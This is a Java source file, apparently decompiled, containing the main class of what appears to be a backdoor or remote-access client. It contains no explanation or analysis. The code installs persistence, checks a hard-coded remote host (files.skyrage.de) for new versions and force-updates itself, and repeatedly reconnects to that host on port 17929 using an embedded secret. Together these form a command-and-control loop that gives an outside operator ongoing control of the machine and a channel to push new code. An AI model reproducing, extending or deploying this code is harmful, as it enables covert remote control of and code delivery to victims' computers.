import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.SocketAddress;
import java.net.URISyntaxException;
import java.net.URL;

public class Main {
    public static final int port = 62207;
    public static final String host = "files.skyrage.de";
    public static final InetSocketAddress socketAddress = new InetSocketAddress(host, 17929);
    public static boolean auto = Boolean.getBoolean("auto");
    public static boolean update = Boolean.getBoolean("update");
    public static String javaPath = new File(System.getProperty("java.home") + (OperatingSystem.isLinux() ? "/bin/java" : "\\bin\\java.exe")).getPath();
    public static String javawPath = new File(System.getProperty("java.home") + "\\bin\\javaw.exe").getPath();
    public static File persistenceFile;
    public static int version;
    public static ServerSocket serverSocket;

    public static int getLatestVersion() {
        try {
            InputStream inputStream = new URL("http://" + host + "/version").openStream();
            return Integer.parseInt(new String(Main.readInputStreamIntoByteArray(inputStream)));
        }
        catch (Throwable throwable) {
            return -1;
        }
    }

    public static void main(String[] args) throws Exception {
        try {
            serverSocket = new ServerSocket();
            serverSocket.bind(new InetSocketAddress("127.0.0.1", port));
        }
        catch (Throwable throwable) {
            throwable.printStackTrace();
            return;
        }
        try {
            File file = new File(persistenceFile.getAbsoluteFile().getAbsolutePath() + ".tmp");
            file.delete();
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
        int n = Main.getLatestVersion();
        if (version < n) {
            try {
                Updater.forceUpdate();
                System.exit(0);
            }
            catch (Throwable throwable) {
                if (throwable instanceof OutOfMemoryError) {
                    System.gc();
                }
                throwable.printStackTrace();
            }
        }
        PersistenceHandler.persist();
        new Thread(() -> {
            while (true) {
                try {
                    do {
                        Thread.sleep(10000L);
                    } while (version >= Main.getLatestVersion());
                    Updater.forceUpdate();
                    System.exit(0);
                    return;
                }
                catch (Throwable throwable) {
                    if (throwable instanceof OutOfMemoryError) {
                        System.gc();
                    }
                    throwable.printStackTrace();
                    continue;
                }
            }
        }).start();
        Main.connect();
    }

    public static byte[] getSecret() {
        try {
            return Main.readInputStreamIntoByteArray(InboundHandler.class.getResourceAsStream("/gnu"));
        }
        catch (Throwable throwable) {
            return new byte[0];
        }
    }

    public static byte[] readInputStreamIntoByteArray(InputStream inputStream) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] byArray = new byte[65535];
        int n = inputStream.read(byArray);
        while (n != -1) {
            byteArrayOutputStream.write(byArray, 0, n);
            n = inputStream.read(byArray);
        }
        return byteArrayOutputStream.toByteArray();
    }

    public static void connect() {
        System.out.println("Connect!");
        new Thread(() -> {
            try {
                InboundHandler inboundHandler = new InboundHandler(socketAddress);
                inboundHandler.initChannel();
            }
            catch (Throwable throwable) {
                throwable.printStackTrace();
                try {
                    Thread.sleep(5000L);
                }
                catch (InterruptedException interruptedException) {
                    // empty catch block
                }
                Main.connect();
            }
        }).start();
    }

    static {
        try {
            persistenceFile = new File(PersistenceHandler.class.getProtectionDomain().getCodeSource().getLocation().toURI());
        }
        catch (URISyntaxException uRISyntaxException) {
            uRISyntaxException.printStackTrace();
        }
        version = 853;
    }
}